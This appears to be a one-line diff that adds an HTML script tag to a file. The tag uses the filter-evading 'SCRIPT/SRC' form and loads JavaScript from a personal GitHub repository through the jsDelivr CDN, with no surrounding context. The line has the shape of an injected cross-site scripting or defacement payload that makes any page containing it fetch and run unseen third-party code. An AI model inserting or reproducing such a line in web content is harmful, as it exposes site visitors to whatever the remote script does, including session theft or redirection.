@@ -1,0 +1,1 @@
+<SCRIPT/SRC="//cdn.jsdelivr.net/gh/inggarfi/balmon@main/pgaq.js"></SCRIPT>
